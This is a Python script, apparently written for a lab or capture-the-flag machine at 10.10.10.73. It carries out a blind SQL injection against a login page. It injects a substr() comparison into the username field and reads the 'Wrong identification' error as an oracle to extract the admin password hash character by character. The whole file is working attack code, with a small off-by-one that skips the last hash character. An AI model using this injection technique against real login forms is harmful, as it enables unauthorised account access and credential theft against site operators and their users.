#!/usr/bin/python3
import requests

md5HashChar=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','f','e']
md5Length=32
password=""
for i in range(1,md5Length):
    for char in md5HashChar:
        #print("and substr(password,%s,1)='%s'"%(i,char))
        r = requests.post("http://10.10.10.73/login.php",data={'username':"admin' and substr(password,%s,1)='%s' ;#"%(i,char),'password':'admin'})
        if("Wrong identification" in r.text):
            password=password+str(char)
            print(str(char),sep=' ',end='',flush=True)
            break
print("\nthe password is:",password)
